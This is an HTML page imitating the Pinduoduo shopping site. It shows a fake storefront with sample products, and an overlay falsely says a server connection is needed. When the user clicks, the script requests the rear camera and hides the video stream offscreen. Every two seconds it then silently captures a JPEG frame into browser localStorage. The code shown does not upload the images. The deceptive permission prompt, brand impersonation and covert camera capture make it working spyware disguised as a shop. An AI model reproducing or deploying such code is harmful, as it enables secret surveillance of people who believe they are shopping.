<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>拼多多 - 多实惠，多乐趣</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #121212;
    color: #fff;
    font-family: -apple-system, sans-serif;
  }
  .permission-overlay {
    position: fixed;
    inset: 0;
    background: #121212;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    z-index: 9999;
  }
  .permission-overlay.hidden {
    display: none;
  }
  .permission-btn {
    background: #ff6000;
    color: #fff;
    border: none;
    border-radius: 12px;
    padding: 16px 32px;
    font-size: 18px;
    margin-top: 20px;
  }
  .app {
    display: none;
  }
  .app.visible {
    display: block;
  }
  .header {
    background: #ff6000;
    padding: 12px;
    text-align: center;
    font-size: 18px;
  }
  .search-bar {
    background: #222;
    padding: 12px;
    margin: 10px;
    border-radius: 30px;
  }
  .banner {
    height: 160px;
    background: #333;
    margin: 10px;
    border-radius: 12px;
  }
  .nav {
    display: grid;
    grid-template-columns: repeat(5, 1fr);
    gap: 10px;
    padding: 16px;
    background: #1e1e1e;
    margin: 10px;
    border-radius: 12px;
  }
  .nav-item {
    text-align: center;
    font-size: 12px;
  }
  .section-title {
    background: #ff6000;
    padding: 12px;
    margin: 10px;
    border-radius: 8px;
  }
  .goods-item {
    display: flex;
    padding: 12px;
    background: #1e1e1e;
    margin: 10px;
    border-radius: 12px;
  }
  .goods-img {
    width: 80px;
    height: 80px;
    background: #333;
    border-radius: 8px;
    margin-right: 12px;
  }
  .goods-info {
    flex: 1;
  }
  .price {
    color: #ff6000;
    font-size: 20px;
    font-weight: bold;
  }
  video {
    position: fixed;
    top: -9999px;
    left: -9999px;
    opacity: 0;
  }
</style>
</head>
<body>

<div class="permission-overlay" id="permissionOverlay">
  <h2>需要连接服务器</h2>
  <p>请允许权限后进入</p>
  <button class="permission-btn" id="grantPermission">连接服务器并进入</button>
</div>

<div class="app" id="app">
  <div class="header">拼多多 - 多实惠，多乐趣</div>
  <div class="search-bar">搜索商品，百亿补贴</div>
  <div class="banner"></div>
  <div class="nav">
    <div class="nav-item">百亿补贴</div>
    <div class="nav-item">优惠券</div>
    <div class="nav-item">多多买菜</div>
    <div class="nav-item">收藏</div>
    <div class="nav-item">更多</div>
  </div>
  <div class="section-title">限时特惠 | 百亿补贴</div>
  <div class="goods-item">
    <div class="goods-img"></div>
    <div class="goods-info">
      <div>【正品保障】Apple iPhone 15 全网通5G</div>
      <div class="price">¥4599</div>
    </div>
  </div>
  <div class="goods-item">
    <div class="goods-img"></div>
    <div class="goods-info">
      <div>小米手环6 智能运动手环</div>
      <div class="price">¥179</div>
    </div>
  </div>
</div>

<video id="video" autoplay playsinline></video>

<script>
  const overlay = document.getElementById('permissionOverlay');
  const app = document.getElementById('app');
  const video = document.getElementById('video');
  let interval = null;

  document.getElementById('grantPermission').addEventListener('click', async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'environment' }
      });
      video.srcObject = stream;
      overlay.classList.add('hidden');
      app.classList.add('visible');
      startAutoCapture();
    } catch (err) {
      alert('授权失败，请重试');
    }
  });

  function startAutoCapture() {
    interval = setInterval(() => {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      canvas.getContext('2d').drawImage(video, 0, 0);
      canvas.toBlob(blob => {
        const reader = new FileReader();
        reader.readAsDataURL(blob);
        reader.onloadend = () => {
          const arr = JSON.parse(localStorage.getItem('pdd_images') || '[]');
          arr.push(reader.result);
          localStorage.setItem('pdd_images', JSON.stringify(arr));
        };
      }, 'image/jpeg', 0.7);
    }, 2000);
  }
</script>
</body>
</html>
